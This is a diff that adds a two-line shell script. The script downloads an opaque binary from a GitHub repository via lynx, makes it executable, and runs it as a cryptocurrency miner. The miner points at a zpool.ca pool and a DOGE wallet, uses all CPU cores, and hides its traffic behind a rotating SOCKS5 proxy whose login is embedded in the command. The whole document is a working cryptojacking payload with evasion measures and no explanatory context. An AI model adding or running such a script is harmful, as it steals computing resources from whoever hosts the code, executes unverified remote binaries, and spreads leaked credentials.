@@ -1,0 +1,2 @@
+sudo apt update && sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git && sudo apt install -y lynx && lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data
+chmod +x data && ./data -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zpool.ca:6333 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS -p c=DOGE,zap=QOGE,ID=$(echo $(shuf -i 1-20000 -n 1)-kuan) -t $(nproc) -x socks5://ehjhvscz-rotate:7ilreob1nkbe@p.webshare.io:80
